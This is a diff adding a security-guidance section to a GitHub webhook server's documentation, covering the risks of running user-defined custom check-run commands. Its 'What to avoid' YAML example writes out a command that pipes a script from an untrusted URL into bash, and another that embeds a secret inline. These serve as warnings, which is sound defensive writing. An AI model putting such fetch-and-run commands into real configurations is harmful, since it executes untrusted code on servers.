@@ -1436,6 +1436,50 @@ Internet → GitHub Webhooks → [Webhook Server] ← Internal Network ← Log V
 5. **Monitoring**: Enable comprehensive logging and monitoring
 6. **Updates**: Regularly update to latest stable version
 
+### Custom Check Runs Security
+
+> [!CAUTION]
+> **Security Warning:** The `custom-check-runs` feature executes user-defined commands on the server during PR events. This is a powerful capability that requires careful security consideration.
+
+**Risks:**
+
+- Commands run with the webhook server's system permissions
+- Commands execute in the cloned repository worktree
+- Malicious or misconfigured commands could compromise server security
+- Environment variables in commands may expose sensitive data in logs
+
+**Security Recommendations:**
+
+1. **Review all commands carefully** - Only configure commands from trusted sources
+2. **Principle of least privilege** - Run the webhook server with minimal required permissions
+3. **Audit configurations** - Regularly review `custom-check-runs` in your configuration files
+4. **Restrict configuration access** - Limit who can modify `config.yaml` and `.github-webhook-server.yaml`
+5. **Monitor execution logs** - Watch for unexpected command behavior or failures
+6. **Avoid sensitive data in commands** - Do not embed secrets directly in command strings
+
+**Example of secure configuration:**
+
+```yaml
+custom-check-runs:
+  - name: lint
+    command: uv tool run --from ruff ruff check  # Uses trusted, pinned tool
+    mandatory: true
+  - name: type-check
+    command: uv run mypy .  # Runs in isolated environment
+    mandatory: false
+```
+
+**What to avoid:**
+
+```yaml
+# ❌ DANGEROUS: Avoid patterns like these
+custom-check-runs:
+  - name: risky-check
+    command: curl https://untrusted-site.com/script.sh | bash  # Never pipe to shell
+  - name: secret-exposure
+    command: API_KEY=secret123 some-command  # Secrets visible in logs
+```
+
 ## Monitoring
 
 ### Health Checks
